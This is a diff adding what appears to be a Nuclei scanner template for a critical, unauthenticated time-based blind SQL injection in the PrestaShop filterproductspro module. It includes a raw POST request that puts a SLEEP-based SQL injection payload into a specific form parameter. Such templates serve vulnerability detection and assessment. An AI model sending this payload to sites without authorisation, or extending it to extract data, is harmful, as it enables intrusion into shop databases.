@@ -1,0 +1,51 @@
+id: filterproductspro-sqli
+
+info:
+  name: PrestaShop filterproductspro - Time-Based Blind SQL Injection
+  author: acunetix-export
+  severity: critical
+  description: |
+    Module filterproductspro for PrestaShop contains time-based blind SQL injection
+    in /module/filterproductspro/actions via POST parameter params[searcher][22][3_22_0].
+    No authentication required.
+  reference:
+    - https://security.friendsofpresta.org/
+  classification:
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    verified: true
+    max-request: 2
+    framework: prestashop
+    module: filterproductspro
+  tags: sqli,prestashop,filterproductspro,time-based,blind
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/modules/filterproductspro/"
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code != 404 && status_code != 403 && duration <= 3'
+        internal: true
+
+  - raw:
+      - |
+        @timeout: 20s
+        POST /module/filterproductspro/actions HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+
+        params%5Bsearcher%5D%5B22%5D%5B3_22_0%5D=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(6))a)--+-
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=6'
+      - type: dsl
+        dsl:
+          - 'status_code != 404 && status_code != 403'
